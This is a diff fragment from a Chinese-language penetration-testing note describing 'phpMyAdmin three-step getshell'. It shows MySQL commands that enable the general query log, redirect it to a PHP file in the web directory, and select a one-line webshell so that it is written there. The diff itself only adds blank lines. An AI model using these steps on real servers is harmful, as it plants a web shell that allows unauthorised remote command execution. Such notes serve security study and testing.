@@ -23,8 +23,10 @@ phpmyadmin三步getshell（需要root权限，需要知道网站路径）
 ```
 将查询内容记录到日志里面
 set global general_log='on';  #开启日志
+
 ---
 SET global general_log_file='D:/xxxx/WWW/cmd.php'; #修改日志路径
+
 ---
 SELECT 一句话;
 ```
